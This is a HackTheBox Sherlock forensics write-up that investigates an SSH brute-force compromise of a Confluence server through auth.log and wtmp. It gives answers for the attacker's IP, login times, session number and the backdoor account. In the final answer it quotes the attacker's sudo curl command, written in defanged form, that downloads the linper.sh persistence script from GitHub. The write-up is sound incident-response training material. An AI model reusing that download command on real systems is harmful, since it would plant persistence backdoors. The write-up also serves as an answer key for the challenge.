# Brutus – SSH Brute Force Investigation Using auth.log & wtmp

## HackTheBox

## Scenario

In this Sherlock challenge, we investigate a compromised Confluence server that was brute-forced through its SSH service. After successfully gaining access, the attacker performed multiple post-exploitation activities. Using Unix `auth.log` and `wtmp` logs, we analyze login attempts, identify successful authentication, trace privilege escalation, detect persistence mechanisms, and uncover attacker activity on the system. 

## Alert

Multiple failed SSH login attempts detected against the Confluence server, followed by a successful login from the same external IP address. Suspicious privilege escalation and new session activity observed in `auth.log` and `wtmp`, indicating potential unauthorized access and persistence.

---

## Challenge Questions

1.Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

The Brute force attempted on the SSH. So we have to filter the auth.log file by the command that Accepted the password , that allowed the attacker to login in SSH on different ports and Users.

Successfully gained access on Root and Cyberjunkie  

```jsx
cat auth.log | grep -i 'Accepted'
```

<img width="852" height="134" alt="Screenshot 2026-02-20 142132" src="https://github.com/user-attachments/assets/bf6aa6aa-9331-4f17-b205-298796b0d276" />

Answer: 65.2.161.68

---

2.The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

The attacker gained the root access on the server by Brute forcing the SSH 

<img width="912" height="119" alt="Screenshot 2026-02-20 143849" src="https://github.com/user-attachments/assets/fa1d5036-e04b-4140-9d82-e1dfde8519e7" />

Answer: root

---

3.Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

There is a file called wtmp, it contains full timestamp detail where auth.log have only month, day, Time. But we need a year-month-day and timestamp. 

I have used command utmpdump:

- The `utmpdump` command is a Linux utility used to display the contents of system audit log files (`utmp`, `wtmp`, and `btmp`) in a readable, raw ASCII format. These log files are binary files that track user login/logout history, system reboots, and failed login attempts.

We know that the attacker IP is 65.2.161.68

<img width="894" height="436" alt="Screenshot 2026-02-20 145209" src="https://github.com/user-attachments/assets/1c99048c-b55b-4e38-ad9f-e4c9b4bad81b" />

I have confirmed it with the Timestamp in 06:32:44

<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/f103c26e-f9ea-434e-ac24-8c961a24820a" />

Answer: 2024-03-06 06:32:45

---

4.SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

I have used grep command to filter by session, And the attacker gained access of root also i used another grep command to filter it out.

<img width="901" height="306" alt="Screenshot 2026-02-20 152013" src="https://github.com/user-attachments/assets/acc1efb2-7d6b-43c0-bddf-47902b0fa007" />

I have confirmed by checking with the timestamp, the attacker gained the access on 06:32:44 by looking at this 

<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/d4de38c6-8ed4-4089-b113-03ff9ddbb189" />

Answer: 37

---

5.The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Previously we have found a user cyberjunkie where the passwords where accepted 
<img width="767" height="102" alt="Screenshot 2026-02-20 152616" src="https://github.com/user-attachments/assets/eefb3fc1-c628-4c9c-be37-3b88be763dfe" />

I have used this grep to find the log details about the cyberjunkie

<img width="960" height="283" alt="Screenshot 2026-02-20 152809" src="https://github.com/user-attachments/assets/b71a414e-bdc8-4bde-8df8-39862a518b39" />

On 06:34:18 the attacker created and added to group

Answer: cyberjunkie

---

6.What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

In the MITRE ATT&CK official site we can check out the technique and sub-techniques about the attacker next move. We know that attacker is moving persistence technique.

<img width="960" height="480" alt="Screenshot 2026-02-20 155256" src="https://github.com/user-attachments/assets/47e994aa-8ab9-4ab5-94c8-a99953fdb105" />

Answer: T1136.001

---

7.What time did the attacker's first SSH session end according to auth.log?

In the question they have asked yyyy-mm-dd but the auth.log contains only month,day and time.

I have used utmpdump wtmp to view the full timestamp

<img width="960" height="425" alt="Screenshot 2026-02-20 160314" src="https://github.com/user-attachments/assets/8595a320-2ed4-41c7-8dc0-26509bddfdc7" />

This was the timestamp recorded that SSH session ended 

Answer: 2024-03-06 06:37:24

---

8.The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

We know that attacker is now using the user name cyberjunkie so i filtered that using the command.

The attacker just installed the backdoor script using the curl command. 

```jsx
cat auth.log | grep -i 'cyberjunkie'
```

<img width="960" height="309" alt="Screenshot 2026-02-20 161015" src="https://github.com/user-attachments/assets/4768876a-034f-421c-9db0-1c0efddbe80b" />

Answer: /usr/bin/curl hxxps[://]raw[.]githubusercontent[.]com/montysecurity/linper/main/linper[.]sh

---

<img width="591" height="212" alt="Screenshot 2026-02-20 161428" src="https://github.com/user-attachments/assets/5d66da2d-d228-4504-9923-5970b2e9e3c4" />

---

## Author

### RUTHRAN-SEC
